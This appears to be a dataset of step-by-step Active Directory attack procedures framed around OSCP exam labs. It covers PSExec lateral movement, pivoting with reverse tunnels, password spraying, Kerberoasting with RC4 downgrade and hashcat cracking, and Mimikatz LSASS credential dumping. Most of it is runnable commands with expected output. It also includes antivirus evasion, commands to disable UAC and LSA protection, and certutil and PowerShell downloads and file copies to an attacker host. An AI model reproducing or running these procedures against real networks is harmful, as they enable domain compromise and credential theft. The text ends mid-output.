Target: copy C:\\Windows\\Temp\\creds.txt \\\\<KALI_IP>\\share\

FILE EXFILTRATION:

Access C$ share from Kali:
smbclient //192.168.50.100/C$ -U 'corp.com/sqlsvc%SQLPass2023'
smb: \\> cd Users\\Administrator\\Desktop
smb: \\> get proof.txt
smb: \\> get local.txt

MULTI-TARGET WORKFLOW:

From pwned_access.txt:
192.168.50.100 - sqlsvc (SQL01)
192.168.50.105 - webadmin (WEB01)
192.168.50.1 - Administrator (DC01)

Sequential access:
for target in ""192.168.50.100:sqlsvc:SQLPass2023"" ""192.168.50.105:webadmin:IIS2023Web!"" ""192.168.50.1:Administrator:Password123!""; do
  IP=$(echo $target | cut -d ':' -f 1)
  USER=$(echo $target | cut -d ':' -f 2)
  PASS=$(echo $target | cut -d ':' -f 3)
  
  echo ""[*] Accessing $IP as $USER""
  impacket-psexec ""corp.com/$USER:$PASS@$IP"" ""whoami && hostname && ipconfig"" >> recon_$IP.txt
done

OPSEC IMPACT:

- PSExec service creation = EventID 7045 (Service installed)
- File write to ADMIN$ = EventID 5145 (Network share object accessed)
- Process creation = EventID 4688 (PSEXESVC.exe)
- LOUD technique - acceptable for exam, use with caution in real engagements

FAILURE SCENARIOS:

- Access denied despite (Pwn3d!): Windows Defender or EDR blocking PSEXESVC
  → Alternative: Use wmiexec or smbexec instead

- ADMIN$ share not writable: Share permissions restricted
  → Alternative: Use atexec (scheduled tasks) or wmiexec

- Service creation blocked: Antivirus or AppLocker policy
  → Alternative: Use native Windows tools (PowerShell remoting, WinRM)

TIME ESTIMATE: 5-10 minutes per target (shell access, initial recon, credential dumping).","",""
"pivot-and-escalate","Pivot to Additional Systems and Escalate Privileges","Use compromised systems as pivot points to access additional targets and escalate to Domain Admin if not already achieved","PIVOTING STRATEGY: Use compromised systems as launching pads to reach previously inaccessible network segments or targets.

PIVOT SCENARIO 1: Database Server as Pivot (SQL01 compromised)

From SYSTEM shell on SQL01:

C:\\> ipconfig /all
(Identify additional network interfaces - may have access to internal DB network)

C:\\> route print
(View routing table - identify reachable subnets)

C:\\> arp -a
(Discover additional systems on local network)

Example output:
Interface: 192.168.50.100
Internet Address      Physical Address
192.168.50.101        00-0c-29-xx-xx-xx (SQL02 - replica server)
192.168.50.102        00-0c-29-xx-xx-xx (APP01 - application server)
10.10.10.50           00-0c-29-xx-xx-xx (INTERNAL_DB - internal network)

C:\\> for /L %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i | find ""Reply"" >> C:\\alive_hosts.txt
(Sweep internal 10.10.10.0/24 subnet)

C:\\> type C:\\alive_hosts.txt
Reply from 10.10.10.1
Reply from 10.10.10.50
Reply from 10.10.10.51

PIVOT SCENARIO 2: Credentials Harvested for Lateral Movement

From Mimikatz dump on SQL01:
- Found: backupadmin:BackupPassword123! (plaintext password)
- Found: fileadmin NTLM hash: 5f4dcc3b5aa765d61d8327deb882cf99

Test new credentials against additional targets:
crackmapexec smb 192.168.50.110 -u backupadmin -p 'BackupPassword123!' -d corp.com
[+] 192.168.50.110:445 FILE01 [+] corp.com\\backupadmin:BackupPassword123! (Pwn3d!)

Access FILE01:
impacket-psexec 'corp.com/backupadmin:BackupPassword123!@192.168.50.110'

PIVOT SCENARIO 3: SSH Tunnel for Deep Network Access

Setup SSH tunnel through SQL01:

On SQL01 (via PSExec shell):
C:\\> curl http://<KALI_IP>:8000/plink.exe -o C:\\Windows\\Temp\\plink.exe
C:\\> C:\\Windows\\Temp\\plink.exe -R 9050:127.0.0.1:9050 kali@<KALI_IP> -pw <KALI_PASS>
(Reverse SOCKS5 tunnel)

On Kali:
Configure proxychains:
Edit /etc/proxychains4.conf:
socks5 127.0.0.1 9050

Access internal network through tunnel:
proxychains impacket-psexec 'corp.com/sqlsvc:SQLPass2023@10.10.10.50'

PRIVILEGE ESCALATION TO DOMAIN ADMIN (If not already achieved):

SCENARIO A: Domain Admin logged into compromised system

From Mimikatz dump:
- Found: corp\\DA_Admin (Domain Admin) logged into SQL01
- NTLM hash: a9b30e5b0dc865eadcea9411e4ade72d

Use immediately:
impacket-psexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d 'corp.com/DA_Admin@192.168.50.1'
(Access DC as Domain Admin)

SCENARIO B: Kerberos Ticket Harvesting

C:\\> C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::tickets /export
(Export Kerberos TGT/TGS tickets from memory)

C:\\> dir *.kirbi
(Find Domain Admin tickets)

Example: [0;3e7]-2-0-60a10000-DA_Admin@krbtgt-CORP.COM.kirbi

Transfer to Kali and convert:
python3 ticketConverter.py [ticket].kirbi DA_Admin.ccache
export KRB5CCNAME=DA_Admin.ccache

Use ticket:
impacket-psexec -k -no-pass 'corp.com/DA_Admin@dc01.corp.com'

SCENARIO C: Token Impersonation

C:\\> C:\\Windows\\Temp\\m.exe privilege::debug token::elevate
(Impersonate SYSTEM token)

C:\\> C:\\Windows\\Temp\\m.exe token::list /user:Administrator
(List available tokens for Administrator)

C:\\> C:\\Windows\\Temp\\m.exe token::elevate /domainadmin
(Impersonate Domain Admin token if available)

SCENARIO D: DCSync from Compromised System (If DA access)

If Domain Admin obtained:
impacket-secretsdump 'corp.com/DA_Admin:Password123!@192.168.50.1' -just-dc-ntlm -outputfile full_domain_dump

(Now have ALL domain credentials - full compromise)

ADDITIONAL LATERAL MOVEMENT OPPORTUNITIES:

(1) PASSWORD REUSE:
Test harvested passwords against all systems:
for pass in ""SQLPass2023"" ""BackupPassword123!"" ""IIS2023Web!""; do
  crackmapexec smb 192.168.50.0/24 -u administrator -p ""$pass"" -d corp.com
done

(2) SERVICE ACCOUNT PIVOTING:
Service accounts often admin on multiple servers:
crackmapexec smb 192.168.50.0/24 -u sqlsvc -p 'SQLPass2023' -d corp.com
(Find all systems where sqlsvc has admin rights)

(3) CACHED CREDENTIALS:
On each compromised system:
reg query ""HKLM\\SECURITY\\Cache"" /s
(Extract cached domain credentials - requires SYSTEM)

DOCUMENT PRIVILEGE ESCALATION PATH:

Create escalation chain documentation:

1. Initial Access: dave (standard user) - AS-REP roasting
2. DCSync Rights: dave (Domain User with replication rights)
3. Targeted DCSync: sqlsvc, webadmin, backup_admin credentials extracted
4. Lateral Movement: SQL01 compromised via sqlsvc PSExec
5. Credential Harvesting: DA_Admin NTLM hash from SQL01 LSASS memory
6. Privilege Escalation: DA_Admin PTH to DC01
7. Domain Compromise: Full DCSync as Domain Admin

Save to: privilege_escalation_chain.md

OBJECTIVE COMPLETION:

Once Domain Admin achieved:
- Access ANY domain resource
- Extract ALL domain credentials (full DCSync)
- Create Golden Ticket for persistence
- Access all flags/objectives
- Complete OSCP exam requirements

EVIDENCE COLLECTION:

Screenshots:
- PSExec SYSTEM shells (whoami showing nt authority\\system)
- Mimikatz credential dumps (showing plaintext passwords/hashes)
- Domain Admin access to DC (proof.txt from DC)
- Privilege escalation chain (visual diagram or markdown)

FAILURE SCENARIOS:

- No Domain Admin logged into any compromised system
  → Try: (1) Wait for DA logon (monitor sessions), (2) Kerberoast remaining SPNs, (3) Local privilege escalation to SYSTEM, then token impersonation

- Cannot pivot to internal networks
  → Alternative: (1) VPN credentials in files, (2) SSH keys, (3) RDP saved credentials

- Token impersonation fails
  → Requires: (1) SYSTEM privileges, (2) Domain Admin actively logged in, (3) SeImpersonatePrivilege enabled

TIME ESTIMATE: 10-20 minutes (depends on privilege escalation complexity).","",""
"discover-password-policy","Discover Domain Password Policy","Retrieve lockout threshold, observation window, and lockout duration to calculate safe spray limits","METHOD SELECTION: Windows domain-joined → use net-accounts-policy (fastest, <5 seconds, built-in command).
Linux with credentials → use crackmapexec-policy (SMBv2/v3 support, reliable).
Linux without credentials (rare) → try enum4linux-policy (null session attempt).

CRITICAL OUTPUT: Lockout threshold (e.g., 5) = max failed attempts before lockout.
Observation window (e.g., 30min) = time until counter resets.
Lockout duration (e.g., 30min) = how long account stays locked.

SAFE SPRAY CALCULATION: threshold - 1 = safe attempts (e.g., 5 threshold = 4 safe attempts).
Test 4 passwords max, then wait observation window duration before next round.","",""
"enumerate-domain-users","Enumerate Valid Domain Users","Build list of valid usernames to spray passwords against","METHOD SELECTION: External or Linux → kerbrute-userenum-ad (fastest, Kerberos-based, thousands per second).
Linux with credentials → ldapsearch-users-ad (comprehensive, gets all AD users via LDAP).
Windows → PowerShell LDAP query (built-in, no tools needed).
Legacy/null session → enum4linux-users-ad (SMB-based).

RECOMMENDED: Kerbrute for speed (enumerates 10k usernames in 30-60 seconds).
Save valid usernames to file (users.txt) for next step.

OPTIONAL: Filter for high-value targets (admin accounts, service accounts) but usually spray against all users for maximum coverage.","",""
"choose-spray-method","Choose Password Spraying Method","Select optimal spray method based on your position and requirements","DECISION MATRIX:

[Windows domain-joined + PowerShell access] → USE spray-passwords-ldap (PowerShell LDAP method).
ADVANTAGES: Policy-aware (automatic lockout protection), low noise (LDAP authentication = normal traffic), no external tools needed.
DISADVANTAGES: Windows only, slower (1-2 attempts/sec).

[Linux + need admin detection] → USE crackmapexec-smb-spray.
ADVANTAGES: Shows (Pwn3d!) for local admin rights immediately, works from Linux.
DISADVANTAGES: NOISY (full SMB connections logged), slow (2-3 sec per attempt), NOT policy-aware (manual calculation required).

[Linux + maximum speed/stealth] → USE kerbrute-passwordspray.
ADVANTAGES: FASTEST (hundreds/sec), STEALTHIEST (2 UDP packets only), cross-platform.
DISADVANTAGES: Doesn't check admin rights, NOT policy-aware.

RECOMMENDATION: If Windows → PowerShell LDAP.
If Linux → Kerbrute for initial spray, then CrackMapExec for admin validation.

This step branches into parallel paths (spray-ldap OR spray-smb OR spray-kerberos).","",""
"spray-ldap","Spray Password via PowerShell LDAP (Windows Method)","Spray common password using PowerShell DirectoryEntry LDAP authentication","FROM WINDOWS ONLY: Use Spray-Passwords.ps1 script (C:\Tools\Spray-Passwords.ps1 on many lab systems).

This script automatically:
(1) Reads password policy to respect lockout settings.
(2) Enumerates all domain users via LDAP.
(3) Attempts authentication for each user with supplied password.
(4) Spaces attempts to stay under lockout threshold.

COMMAND: powershell -ep bypass -c ""C:\Tools\Spray-Passwords.ps1 -Pass 'Password123!' -Admin"".
The -Admin flag includes administrator accounts (default excludes them).
Use -File flag for multiple passwords instead of -Pass for single password.

TIMING: 2-3 minutes for 100 users with single password.

NOISE LEVEL: Very low - generates Event ID 4776 (NTLM credential validation) which looks like normal user logins.","",""
"spray-smb","Spray Password via CrackMapExec SMB (Linux Method)","Spray password via SMB with immediate admin rights detection","FROM LINUX: Use CrackMapExec with users.txt from step 2.

COMMAND: crackmapexec smb TARGET -u users.txt -p 'Password123!' -d domain.com --continue-on-success.
The --continue-on-success flag prevents stopping at first valid credential (tests all users).

CRITICAL: CrackMapExec does NOT check password policy - you must manually limit attempts.
Based on policy from step 1, spray maximum (threshold - 1) passwords total.
Example: 5 threshold = spray 4 different passwords max, with 30min wait between each.

BONUS FEATURE: CrackMapExec shows (Pwn3d!) if credentials have local admin rights on target system.
This immediately identifies privilege escalation opportunities.

TARGET can be any domain-joined system IP or domain controller.

TIMING: 2-3 minutes for 50 users.","",""
"spray-kerberos","Spray Password via Kerbrute Kerberos (Linux/Windows Fast Method)","Spray password using Kerberos pre-authentication for maximum speed and stealth","CROSS-PLATFORM: Use Kerbrute from Linux or Windows.

COMMAND: kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Password123!'.
Uses Kerberos AS-REQ for authentication - only 2 UDP packets per attempt.

FASTEST METHOD: Can test hundreds of attempts per second.

STEALTHIEST: Generates minimal logging (Event ID 4768/4771 - normal Kerberos traffic).

CRITICAL: Does NOT check password policy - manually limit to (threshold - 1) attempts per user per observation window.

Save results: add -o valid_creds.txt flag.

TIMING: 10-30 seconds for 100 users.

LIMITATION: Does NOT show local admin rights (use CrackMapExec in next step for admin validation).","",""
"validate-found-credentials","Validate and Check Admin Rights","Confirm credentials are valid and identify systems where user has local admin privileges","Use CrackMapExec to:
(1) Validate credentials via SMB authentication.
(2) Check for local admin rights on network systems.
(3) Identify best pivot targets.

SUBNET SCAN: crackmapexec smb 192.168.50.0/24 -u username -p 'Password123!' -d domain.com.
This scans entire /24 subnet and shows which systems display (Pwn3d!) = local admin rights.

SINGLE TARGET: Test against specific high-value targets (domain controller, servers, administrator workstations).

Look for: [+] = valid credentials.
[+] (Pwn3d!) = valid credentials + local admin = full system compromise possible.

TIME ESTIMATE: 2-3 minutes for /24 subnet scan.","",""
"lateral-movement-admin","Lateral Movement via Local Admin Access","Compromise systems where user has local admin rights to extract additional credentials","IF PWND SYSTEMS FOUND (from previous step): User has local admin = can execute code as SYSTEM.

ATTACK PLAN:
(1) Use psexec/wmiexec/evil-winrm to get SYSTEM shell on (Pwn3d!) system.
(2) Dump SAM database: crackmapexec smb TARGET -u username -p password -d domain.com --sam (extracts local user hashes).
(3) Dump LSA secrets: crackmapexec smb TARGET -u username -p password -d domain.com --lsa (extracts cached domain credentials, service account passwords).
(4) Dump LSASS memory with Mimikatz (extract Kerberos tickets, plaintext passwords).
(5) Search for cached Domain Admin credentials or service accounts with high privileges.
(6) Use extracted credentials for further lateral movement.

OSCP STRATEGY: Local admin on ONE workstation can lead to domain compromise if Domain Admin credentials are cached or Kerberos tickets are available.","",""
"lateral-movement-standard-user","Lateral Movement as Standard Domain User","Leverage standard user credentials for AD enumeration and alternative pivoting","IF NO PWND SYSTEMS: User is standard domain user (no local admin anywhere).

STILL VALUABLE - standard domain users can:
(1) Enumerate Active Directory (users, groups, computers, GPOs, ACLs).
(2) Access file shares (look for passwords in files, scripts, GPP passwords in SYSVOL).
(3) Kerberoast (request service tickets and crack offline).
(4) AS-REP roast (attack users with pre-auth disabled).
(5) Search for ACL abuse opportunities (GenericAll, WriteDACL, etc.).
(6) Attempt local privilege escalation on accessible systems (unquoted service paths, weak permissions, AlwaysInstallElevated).
(7) Authenticate to web applications, VPN, Citrix, or other services.

OSCP STRATEGY: Standard user credentials are STARTING POINT for AD attacks, not dead end.
Proceed with AD enumeration and privilege escalation techniques.","",""
"authenticate-to-domain","Authenticate to Domain with Valid Credentials","Establish authenticated session to Active Directory (required for SPN enumeration and TGS requests)","REQUIREMENT: Valid domain user credentials.
ANY domain user can perform Kerberoasting - even Guest account (if enabled) or low-privilege user (standard user, no admin rights).

AUTHENTICATION IS MANDATORY: Unlike AS-REP roasting (which can work unauthenticated), Kerberoasting REQUIRES authentication to query SPNs and request TGS tickets.

LINUX: Credentials provided via command line: impacket-GetUserSPNs <DOMAIN>/<USERNAME>.
Password prompted interactively OR provided with -hashes flag (NTLM hash) OR -k flag (Kerberos ticket).

WINDOWS: Use current user session OR runas /netonly /user:<DOMAIN>\<USERNAME> cmd.exe to inject credentials.
Rubeus automatically uses current session context.

VERIFICATION: Linux → impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (should list SPNs if credentials valid).
Windows → whoami /groups (should show domain groups).

TIME SYNC: Ensure system time synchronized with DC (ntpdate <DC_IP>) to avoid KRB_AP_ERR_SKEW errors.","",""
"enumerate-spns","Enumerate Service Principal Names","Identify all SPNs registered to USER accounts (potential Kerberoasting targets)","SPN ENUMERATION WITHOUT HASH EXTRACTION: Linux → impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME> (no -request flag = enumeration only).
Windows → Rubeus.exe kerberoast (shows SPNs) OR setspn -Q */* (shows ALL SPNs including computer accounts).

OUTPUT ANALYSIS: ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - prioritize privileged accounts), PasswordLastSet (old = weak password likely).

FILTER TARGETS:
(1) IGNORE computer accounts (ending in $) - 120-char random passwords, uncrackable.
(2) IGNORE MSA/gMSA accounts (managed service accounts) - 120-char random passwords, uncrackable.
(3) TARGET user accounts with SPNs (sql_service, iis_service, svc_*, etc.).

PRIORITIZATION:
(1) Old PasswordLastSet dates (>1 year = weak password likely).
(2) Privileged group membership (Domain Admins, high-value).
(3) Common service names (sql_service often has 'Password1!' or similar).

TIME ESTIMATE: 5-10 seconds for enumeration.

EXPECTED RESULTS: 0-10 user SPNs typical.
0 SPNs = less common but possible (all services run as computer accounts).
>10 = large environment or many custom services.","",""
"filter-spn-accounts","Filter Out Computer and Managed Service Accounts","Remove uncrackable accounts (computer accounts and MSAs) from target list","COMPUTER ACCOUNTS: Identified by $ at end of name (e.g., WEB01$, SQL-SERVER$).
PASSWORD POLICY: 120 characters, random, auto-rotated every 30 days by AD.
UNCRACKABLE with current technology (120-char keyspace = infeasible).
FILTER OUT: Do NOT request TGS for computer accounts - wastes time and generates unnecessary traffic.

MANAGED SERVICE ACCOUNTS (MSA/gMSA): Identified by msDS-ManagedServiceAccount objectClass OR msDS-GroupManagedServiceAccount.
Same 120-char random password policy.
UNCRACKABLE.
FILTER OUT: Exclude from Kerberoasting targets.

USER SERVICE ACCOUNTS: Regular user accounts (not ending in $, not MSA) with servicePrincipalName attribute.
PASSWORD POLICY: Standard domain user policy (often 7-14 chars, user-chosen password).
CRACKABLE if weak password (Password1!, ServiceAccount123!, company name + year).
TARGET THESE: sql_service, iis_service, svc_backup, svc_admin, etc.

VERIFICATION: impacket-GetUserSPNs output 'Name' column should NOT end in $ for target accounts.

OSCP TIP: If all SPNs are on computer accounts (all names end in $), Kerberoasting attack surface is zero.
Document and proceed to alternative attacks (AS-REP roasting, password spraying).","",""
"request-tgs-hashes","Request TGS Tickets and Extract Hashes","Request service tickets (TGS) for targeted SPNs and extract TGS-REP hashes for offline cracking","LINUX: impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>.
The -request flag triggers TGS requests for ALL identified user SPNs.
Output shows TGS-REP hashes in Hashcat mode 13100 format.
Add -outputfile hashes.kerberoast to save to file.

WINDOWS: Rubeus.exe kerberoast /outfile:C:\hashes.kerberoast.
Automatically requests TGS for all user SPNs and extracts hashes.

CRITICAL: Rubeus may show 'NOTICE: AES hashes will be returned for AES-enabled accounts' - this means TGS is encrypted with AES (slower to crack).
Use /tgtdeleg flag to force RC4 downgrade: Rubeus.exe kerberoast /tgtdeleg /outfile:C:\hashes_rc4.kerberoast.

HASH FORMAT: $krb5tgs$23$ = Kerberos 5 TGS-REP etype 23 (RC4-HMAC) = Hashcat mode 13100.
$krb5tgs$17$ or $krb5tgs$18$ = AES encryption = Hashcat mode 19600/19700 (slower).

RC4 VS AES: RC4 cracking ~10x faster than AES.
If Rubeus shows AES, use /tgtdeleg to downgrade.

TIME ESTIMATE: <10 seconds for hash extraction.

EXPECTED OUTPUT: One $krb5tgs$ hash per user SPN from step 3.","",""
"transfer-hashes","Transfer Hashes to Cracking System (If Needed)","Move TGS-REP hash files from Windows to Linux Kali system for Hashcat cracking","SKIP IF: Hashes extracted on Kali with impacket-GetUserSPNs.
Proceed directly to step 6 (crack-tgsrep-hashes).

REQUIRED IF: Hashes extracted on Windows with Rubeus.
Transfer to Kali for cracking (better wordlists, GPU support).

TRANSFER METHODS:
(1) SMB SHARE: Kali → sudo impacket-smbserver share /home/kali/hashes -smb2support -username user -password pass.
Windows → copy C:\hashes.kerberoast \\KALI_IP\share\.

(2) RDP DISK SHARE: rdesktop -r disk:share=/home/kali/hashes <WINDOWS_IP>, Windows → copy C:\hashes.kerberoast \\tsclient\share\.

(3) BASE64 ENCODE: Windows → certutil -encode C:\hashes.kerberoast C:\hashes.b64, copy output to Kali, base64 -d > hashes.kerberoast.

(4) PYTHON HTTP: Kali → python3 -m http.server 8000, Windows → Invoke-WebRequest -Uri http://KALI_IP:8000 -Method POST -InFile C:\hashes.kerberoast.

VERIFICATION: cat hashes.kerberoast on Kali shows $krb5tgs$23$ hashes.
wc -l hashes.kerberoast shows hash count matches Windows extraction.

TIME ESTIMATE: 30-90 seconds.","",""
"crack-tgsrep-hashes","Crack TGS-REP Hashes with Hashcat Mode 13100","Recover plaintext service account passwords from TGS-REP hashes using dictionary and rule-based attacks","HASHCAT MODE: 13100 (Kerberos 5, etype 23, TGS-REP).
VERIFY: hashcat --help | grep -i 'Kerberos' shows mode 13100 for TGS-REP.

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force (14M passwords, try first).

(2) RULE-BASED: hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds mutations).

(3) TARGETED: Service account passwords often follow patterns: ServiceName (sql → MSSQLService), ServiceName + year (iis → IIS2019!), Company name (Acme → AcmeSQL123!).
Create custom wordlist.

(4) COMPREHENSIVE: Use rockyou-30000.rule for thorough attack (30K mutations, takes hours).

--force FLAG: Required in VM without GPU.

MONITORING: Press 's' for status, --status --status-timer=30 for updates.

RC4 vs AES: RC4 (mode 13100) much faster.
AES (mode 19600/19700) 10x slower.
Prefer RC4 hashes from Rubeus /tgtdeleg.

TIME ESTIMATE: Weak password (dictionary word + number) = 5-30 minutes with rules.
Medium password (10 random chars) = hours to days.
Strong password (12+ random) = infeasible.","",""
"extract-passwords","Extract and Document Cracked Passwords","Extract plaintext passwords from Hashcat output and document service account credentials","HASHCAT POTFILE: All cracked passwords automatically saved to ~/.hashcat/hashcat.potfile.

VIEW RESULTS: hashcat -m 13100 hashes.kerberoast --show.
Output format: hash:password OR username:hash:password (if --username flag used).

EXTRACT PASSWORDS: hashcat -m 13100 hashes.kerberoast --show --outfile-format=2 shows passwords only (no hashes).
Better for documentation: --outfile-format=5 shows hash:password pairs.

PARSE OUTPUT: For impacket format: grep '$krb5tgs' output shows full hash.
Extract username from hash: $krb5tgs$23$*USERNAME$REALM$...
Extract password after final colon.
For Rubeus format: output shows SamAccountName and password.

DOCUMENTATION: Create credentials file: echo 'iis_service:Strawberry1' >> service_creds.txt.
Document:
(1) Service account name.
(2) Plaintext password.
(3) Associated SPN (HTTP/web04.corp.com).
(4) Group membership (from step 2 enumeration).

TIME ESTIMATE: <30 seconds to extract and document.","",""
"validate-service-credentials","Validate Service Account Credentials and Check Privileges","Confirm cracked service account passwords are valid and identify privilege level and lateral movement opportunities","CREDENTIAL VALIDATION: Use crackmapexec to test credentials.

SINGLE TARGET: crackmapexec smb <DC_IP> -u iis_service -p 'Strawberry1' -d corp.com.
Output: [+] corp.com\iis_service:Strawberry1 confirms valid.

SUBNET SCAN: crackmapexec smb 192.168.50.0/24 -u iis_service -p 'Strawberry1' -d corp.com scans /24 subnet for admin rights.
(Pwn3d!) indicator = local admin on that system.

SERVICE ACCOUNT PRIVILEGES: Service accounts are often OVER-PRIVILEGED:
(1) Local admin on multiple servers (database servers, web servers).
(2) Domain admin membership (poor security practice but common).
(3) High-privilege groups (Backup Operators, Server Operators).
(4) Excessive permissions (GenericAll, WriteDACL on domain objects).

PRIVILEGE CHECK: net user iis_service /domain (shows group membership).
Get-DomainUser iis_service -Properties memberof (PowerView).

LATERAL MOVEMENT: If (Pwn3d!) found → use psexec, evil-winrm, wmiexec for SYSTEM shell.
If Domain Admin → full domain compromise immediately.
If standard service account → enumerate further for privilege escalation paths.

TIME ESTIMATE: Validation (5 sec), subnet scan (2-4 min), privilege analysis (30 sec).","",""
"upload-mimikatz","Upload Mimikatz Binary to Target System","Transfer mimikatz.exe to writable directory on target Windows system","Upload mimikatz binary to target system using available transfer method. Choose writable directory that won't trigger AV.

Transfer Methods (Priority Order):

1. Evil-WinRM Upload (Easiest, built-in):
   - From Evil-WinRM session: cd C:\\temp
   - Upload: upload /path/to/mimikatz.exe
   - Verify: dir mimikatz.exe (should show ~1.2 MB)

2. SMB Copy (Fast, requires SMB server):
   - Start SMB server: impacket-smbserver share /path/to/mimikatz -smb2support
   - From target: copy \\\\<ATTACKER_IP>\\share\\mimikatz.exe C:\\temp\\
   - Verify: dir C:\\temp\\mimikatz.exe

3. PowerShell Download (Requires HTTP server):
   - Start HTTP server: python3 -m http.server 80
   - From target: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\temp\\mimikatz.exe
   - Verify: Get-FileHash C:\\temp\\mimikatz.exe

4. Certutil Download (Alternative):
   - Start HTTP server: python3 -m http.server 80
   - From target: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\\temp\\mimikatz.exe
   - Verify: certutil -hashfile C:\\temp\\mimikatz.exe MD5

Writable Directories (Priority Order):
1. C:\\temp (may not exist - create with: mkdir C:\\temp)
2. C:\\Users\\Public
3. C:\\Windows\\temp (requires higher privileges)
4. C:\\Users\\<USERNAME>\\AppData\\Local\\Temp
5. C:\\ProgramData

Antivirus Evasion:
- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)
- Rename binary: mv mimikatz.exe windowsupdate.exe
- Add to exclusions: Add-MpPreference -ExclusionPath C:\\temp (requires admin)
- Use alternative: pypykatz (Python, less detected)
- In-memory execution: Invoke-Mimikatz (PowerShell, no disk write)

Verification:
1. File exists: dir C:\\temp\\mimikatz.exe
2. Correct size: ~1.2 MB (1,355,776 bytes for v2.2.0)
3. File hash matches: Compare with known good hash
4. Test execution: .\\mimikatz.exe ""exit"" (should run without error)
5. No AV alert: Check Windows Defender quarantine (Get-MpThreatDetection)

Troubleshooting:
- AV deletes immediately: Disable Defender OR use obfuscated version OR use in-memory
- Upload fails: Check network connectivity, try alternative method
- No writable directory: Create C:\\temp or use %TEMP% environment variable
- File corrupted: Verify transfer (compare file size/hash), re-upload
- Permission denied: Verify local admin with: whoami /groups | findstr Admin","",""
"enable-sedbugprivilege","Enable SeDebugPrivilege with privilege::debug","Enable SeDebugPrivilege token required for LSASS memory access - MANDATORY prerequisite","Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This step is MANDATORY and MUST come before any sekurlsa commands.

Command Execution:
```
cd C:\\temp
.\\mimikatz.exe ""privilege::debug"" ""exit""
```

Expected Output (SUCCESS):
```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  ""A La Vie, A L'Amour"" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # exit
Bye!
```

KEY INDICATORS OF SUCCESS:
- ""Privilege '20' OK"" message
- No error messages
- Exit cleanly

Expected Output (FAILURE):
```
mimikatz # privilege::debug
Privilege '20' KO
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

This indicates:
- Not running as local administrator, OR
- UAC is blocking privilege elevation, OR
- SeDebugPrivilege not available in token

WHY THIS IS MANDATORY:
Even local administrators have SeDebugPrivilege in their token, but it's DISABLED by default. Mimikatz 'privilege::debug' ENABLES it. Without enabled SeDebugPrivilege:
- Cannot read LSASS process memory
- sekurlsa commands return ERROR 0x00000005 (Access Denied)
- Credential dump fails completely

Technical Details:
SeDebugPrivilege (Privilege ID 20) allows:
- Reading memory of any process (including protected processes)
- Bypassing normal security checks
- Required for LSASS memory dump (LSASS is protected process)

Verification Methods:

1. Mimikatz output (primary):
   - ""Privilege '20' OK"" = Success
   - ""Privilege '20' KO"" = Failure

2. Windows command (secondary):
   ```
   whoami /priv | findstr SeDebugPrivilege
   ```
   Before: SeDebugPrivilege  Disabled
   After mimikatz: SeDebugPrivilege  Enabled

3. Test sekurlsa command:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""
   ```
   If privilege::debug worked: Credentials appear
   If failed: ERROR 0x00000005

Troubleshooting:

1. ""Privilege '20' KO"":
   - Verify local admin: whoami /groups | findstr ""S-1-5-32-544""
   - Get SYSTEM shell: psexec -s -i cmd.exe (from Sysinternals)
   - Disable UAC: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)

2. UAC Blocking:
   - Run from elevated command prompt (if RDP access)
   - Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)
   - Disable UAC temporarily

3. Token Doesn't Have Privilege:
   - User not in Administrators group (recheck access)
   - Restricted token (some lateral movement methods create restricted shells)
   - Use alternative access method (Evil-WinRM usually provides full token)

Alternative Methods (if privilege::debug fails):
- Use PSExec to get SYSTEM shell: impacket-psexec user@target (SYSTEM has SeDebugPrivilege by default)
- Disable LSA protection: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /f (requires reboot)
- Use alternative tools: pypykatz (different implementation), procdump (uses different method)","",""
"dump-lsass-memory","Dump LSASS Credentials with sekurlsa::logonpasswords","Extract all cached credentials from LSASS memory and save to file for analysis","Execute mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory. MUST redirect output to file (output too long for terminal).

Command Execution:
```
cd C:\\temp
.\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" > credentials.txt
```

Command Breakdown:
- privilege::debug: Enable SeDebugPrivilege (from step 2)
- sekurlsa::logonpasswords: Dump all logon session credentials
- exit: Close mimikatz cleanly
- > credentials.txt: Redirect output to file (CRITICAL - output very long)

Execution Time:
- Small system (<4GB RAM): 2-3 seconds
- Medium system (4-16GB RAM): 5-10 seconds
- Large system (>16GB RAM): 10-30 seconds
- Busy Domain Controller: 30-60 seconds

Expected Output Structure (in credentials.txt):
```
Authentication Id : 0 ; 12345678 (00000000:00bc614e)
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 11/24/2025 10:30:15 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-500
        msv :
         [00000003] Primary
         * Username : administrator
         * Domain   : CORP
